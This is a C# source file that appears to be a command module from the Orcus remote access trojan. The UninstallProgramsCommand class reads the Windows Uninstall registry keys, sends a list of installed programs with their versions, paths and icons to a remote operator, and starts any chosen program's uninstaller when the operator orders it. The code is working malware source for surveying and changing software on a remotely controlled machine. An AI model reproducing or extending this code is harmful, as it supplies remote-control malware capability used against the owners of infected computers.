using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using Microsoft.Win32;
using Orcus.Extensions;
using Orcus.Plugins;
using Orcus.Shared.Commands.UninstallPrograms;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.UninstallPrograms
{
    internal class UninstallProgramsCommand : Command
    {
        private readonly Dictionary<int, string> _uninstallPaths = new Dictionary<int, string>();
        private int _counter;

        private IEnumerable<UninstallableProgram> GetEntries(RegistryKey registryKey,
            UninstallProgramEntryLocation location)
        {
            foreach (var subkeyName in registryKey.GetSubKeyNames())
            {
                using (var subKey = registryKey.OpenSubKey(subkeyName))
                {
                    var name = subKey?.GetValue("DisplayName") as string;
                    var uninstallPath = subKey?.GetValue("UninstallString") as string;
                    if (string.IsNullOrEmpty(name) || string.IsNullOrEmpty(uninstallPath))
                        continue;

                    var id = _counter++;
                    _uninstallPaths.Add(id, uninstallPath);

                    yield return
                        new UninstallableProgram
                        {
                            Id = id,
                            Name = name,
                            Version = subKey.GetValue("DisplayVersion") as string,
                            EntryLocation = location,
                            Location = subKey.GetValue("InstallLocation") as string,
                            Size = (int) subKey.GetValue("EstimatedSize", 0),
                            IconData = GetIconFromPath(subKey.GetValue("DisplayIcon") as string)
                        };
                }
            }
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((UninstallProgramsCommunication) parameter[0])
            {
                case UninstallProgramsCommunication.ListInstalledPrograms:
                    _uninstallPaths.Clear();
                    const string registryKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
                    var list = new List<UninstallableProgram>();

                    var key1 = Registry.LocalMachine.OpenSubKey(registryKey);
                    if (key1 != null)
                        using (key1)
                            list.AddRange(GetEntries(key1, UninstallProgramEntryLocation.LocalMachine));

                    var key2 = Registry.CurrentUser.OpenSubKey(registryKey);
                    if (key2 != null)
                        using (key2)
                            list.AddRange(GetEntries(key2, UninstallProgramEntryLocation.CurrentUser));

                    var key3 =
                        Registry.LocalMachine.OpenSubKey(
                            @"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall");
                    if (key3 != null)
                        using (key3)
                            list.AddRange(GetEntries(key3, UninstallProgramEntryLocation.LocalMachineWow6432Node));

                    var finalList = new List<UninstallableProgram>();
                    foreach (var uninstallableProgram in list)
                    {
                        if (
                            finalList.Any(
                                x =>
                                    x.Location == uninstallableProgram.Location &&
                                    x.Name == uninstallableProgram.Name && x.Version == uninstallableProgram.Version))
                            continue;

                        finalList.Add(uninstallableProgram);
                    }

                    var serializer = new Serializer(typeof (List<UninstallableProgram>));
                    ResponseBytes((byte) UninstallProgramsCommunication.ResponseInstalledPrograms,
                        serializer.Serialize(finalList), connectionInfo);
                    break;
                case UninstallProgramsCommunication.UninstallProgram:
                    var id = BitConverter.ToInt32(parameter, 1);
                    if (!_uninstallPaths.ContainsKey(id))
                    {
                        ResponseByte((byte) UninstallProgramsCommunication.ResponseEntryNotFound, connectionInfo);
                        return;
                    }
                    try
                    {
                        Process.Start(_uninstallPaths[id]);
                    }
                    catch (Exception ex)
                    {
                        ResponseBytes((byte) UninstallProgramsCommunication.ResponseUninstallFailed,
                            Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
                    }

                    ResponseByte((byte) UninstallProgramsCommunication.ResponseProgramUninstallerStarted, connectionInfo);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private byte[] GetIconFromPath(string filename)
        {
            if (filename.IsNullOrWhiteSpace() || filename.Trim('"').IsNullOrWhiteSpace())
                return null;

            Icon icon = null;
            try
            {
                var file = new FileInfo(filename.Trim('"'));
                icon = string.Equals(file.Extension, ".ico", StringComparison.OrdinalIgnoreCase)
                    ? new Icon(file.FullName)
                    : Icon.ExtractAssociatedIcon(file.FullName);
            }
            catch (Exception)
            {
                // ignored
            }

            if (icon == null)
                return null;

            var img = icon.ToBitmap().ResizeImage(20, 20);
            using (var ms = new MemoryStream())
            {
                img.Save(ms, ImageFormat.Png);
                return ms.ToArray();
            }
        }

        protected override uint GetId()
        {
            return 17;
        }
    }
}